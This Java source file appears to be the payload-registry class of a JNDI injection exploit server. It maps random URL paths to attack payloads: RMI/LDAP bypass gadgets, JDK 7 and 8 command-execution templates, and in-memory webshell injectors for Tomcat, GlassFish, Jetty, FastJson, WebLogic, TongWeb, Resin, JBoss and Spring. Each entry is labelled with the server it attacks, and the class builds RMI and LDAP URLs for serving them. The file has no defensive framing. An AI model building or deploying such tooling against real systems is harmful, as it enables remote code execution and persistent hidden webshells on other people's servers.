package utils;

import org.apache.commons.lang3.RandomStringUtils;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.Map;

import static jndi.ServerStart.*;

public class Mapper {
//    public final static Map<String,String> cmdReferences = new HashMap<>();
    public final static Map<String,String> references = new HashMap<String, String>();
    public final static Map<String,String> instructions = new HashMap<String,String>();
//    public final static ArrayList<String> RmiUrl = new ArrayList<String>();
//    public final static ArrayList<String> LdapUrl = new ArrayList<String>();
    public final static ArrayList<String> ExecCmdUrl = new ArrayList<String>();
    public final static ArrayList<String> MemShellUrl = new ArrayList<String>();


    public static final String ANSI_RESET = "\u001B[0m";
    public static final String ANSI_PURPLE = "\u001B[35m";
    public static final String ANSI_RED = "\u001B[31m";
    public static final String ANSI_BLUE = "\u001B[34m";


    static {

    }

//    public static ArrayList<String> getRmiUrl(){
//        return RmiUrl;
//    }
//
//    public static ArrayList<String> getLdapUrl(){
//        return LdapUrl;
//    }

    public static void setUrl(){

        // RMI & LDAP bypass
        references.put(RandomStringUtils.randomAlphanumeric(6).toLowerCase(),"BypassByEL");
        references.put(RandomStringUtils.randomAlphanumeric(6).toLowerCase(),"BypassJavaSerializedData");
        references.put(RandomStringUtils.randomAlphanumeric(6).toLowerCase(),"BypassTomcatMemShell");

        // Exec cmd
        references.put(RandomStringUtils.randomAlphanumeric(6).toLowerCase(),"ExecTemplateJDK8");
        references.put(RandomStringUtils.randomAlphanumeric(6).toLowerCase(),"ExecTemplateJDK7");

        /**
         * Tomcat、GlassFish、Jetty、Fastjson、Weblogic、TongWeb、Resin、JBoss、Spring; Filter & Listener MemShell
         */
        references.put(RandomStringUtils.randomAlphanumeric(6).toLowerCase(),"TomcatFilterMemShell");
//        references.put(RandomStringUtils.randomAlphanumeric(6).toLowerCase(),"TomcatListenerMemShell");
        references.put(RandomStringUtils.randomAlphanumeric(6).toLowerCase(),"GlassFishFilterMemShell");
//        references.put(RandomStringUtils.randomAlphanumeric(6).toLowerCase(),"GlassFishListenerMemShell");
        references.put(RandomStringUtils.randomAlphanumeric(6).toLowerCase(),"JettyFilterMemShell");
//        references.put(RandomStringUtils.randomAlphanumeric(6).toLowerCase(),"JettyListenerMemShell");
        references.put(RandomStringUtils.randomAlphanumeric(6).toLowerCase(),"FastJsonFilterMemShell");
//        references.put(RandomStringUtils.randomAlphanumeric(6).toLowerCase(),"FastJsonListenerMemShell");
        references.put(RandomStringUtils.randomAlphanumeric(6).toLowerCase(),"WeblogicFilterMemShell");
//        references.put(RandomStringUtils.randomAlphanumeric(6).toLowerCase(),"WeblogicListenerMemShell");
        references.put(RandomStringUtils.randomAlphanumeric(6).toLowerCase(),"TongWebFilterMemShell");
//        references.put(RandomStringUtils.randomAlphanumeric(6).toLowerCase(),"TongWebListenerMemShell");
        references.put(RandomStringUtils.randomAlphanumeric(6).toLowerCase(),"ResinFilterMemShell");
//        references.put(RandomStringUtils.randomAlphanumeric(6).toLowerCase(),"ResinListenerMemShell");
        references.put(RandomStringUtils.randomAlphanumeric(6).toLowerCase(),"JBossFilterMemShell");
//        references.put(RandomStringUtils.randomAlphanumeric(6).toLowerCase(),"JBossListenerMemShell");
        references.put(RandomStringUtils.randomAlphanumeric(6).toLowerCase(),"SpringControllerMemShell");
//        references.put(RandomStringUtils.randomAlphanumeric(6).toLowerCase(),"SpringInterceptorMemShell");

        instructions.put("ExecTemplateJDK8","Attack JDK 1.8");
        instructions.put("ExecTemplateJDK7","Attack JDK 1.7");
        instructions.put("BypassByEL","Attack RMI Bypass by ELProcessor");
        instructions.put("BypassJavaSerializedData","Attack LDAP Bypass by SerializedData");
        instructions.put("BypassTomcatMemShell","Attack LDAP Bypass by TomcatMemShell");
        instructions.put("TomcatFilterMemShell","Attack Tomcat");
//        instructions.put("TomcatListenerMemShell","Attack by TomcatListenerMemShell");
        instructions.put("GlassFishFilterMemShell","Attack GlassFish");
//        instructions.put("GlassFishListenerMemShell","Attack by GlassFishListenerMemShell");
        instructions.put("JettyFilterMemShell","Attack Jetty");
//        instructions.put("JettyListenerMemShell","Attack by JettyListenerMemShell");
        instructions.put("FastJsonFilterMemShell","Attack FastJson");
//        instructions.put("FastJsonListenerMemShell","Attack by FastJsonListenerMemShell");
        instructions.put("WeblogicFilterMemShell","Attack Weblogic");
//        instructions.put("WeblogicListenerMemShell","Attack by WeblogicListenerMemShell");
        instructions.put("TongWebFilterMemShell","Attack TongWeb");
//        instructions.put("TongWebListenerMemShell","Attack by TongWebListenerMemShell");
        instructions.put("ResinFilterMemShell","Attack Resin");
//        instructions.put("ResinListenerMemShell","Attack by ResinListenerMemShell");
        instructions.put("JBossFilterMemShell","Attack JBoss");
//        instructions.put("JBossListenerMemShell","Attack by JBossListenerMemShell");
        instructions.put("SpringControllerMemShell","Attack SpringController");
//        instructions.put("SpringInterceptorMemShell","Attack by SpringInterceptorMemShell");

        for (String name : references.keySet()) {
            String reference = references.get(name);
            String mark = " " + "(" + instructions.get(reference) + ")";
            String rmiurl = addr +":"+ rmiPort +"/" + name;
            String ldapurl = addr +":"+ ldapPort +"/" + name;
            String info = "/" + name + " " + mark;
            if (reference.contains("BypassByEL")){
                ExecCmdUrl.add(info);
            }else if(reference.contains("BypassJavaSerializedData")){
                ExecCmdUrl.add(info);
            }else if(reference.contains("ExecTemplate")){
                ExecCmdUrl.add(info);
            }else if(reference.contains("BypassTomcat")){
                MemShellUrl.add(info);
            }
            else {
                MemShellUrl.add(info);
            }
        }
    }

    public static ArrayList<String> getMemShell(){
        return MemShellUrl;
    }

    public static ArrayList<String> getExecCmdUrl(){
        return ExecCmdUrl;
    }

    public static void clearUrl(){
        references.clear();
        instructions.clear();
        ExecCmdUrl.clear();
        MemShellUrl.clear();
    }

    public static void main(String[] args) {
        System.out.println();
    }
}
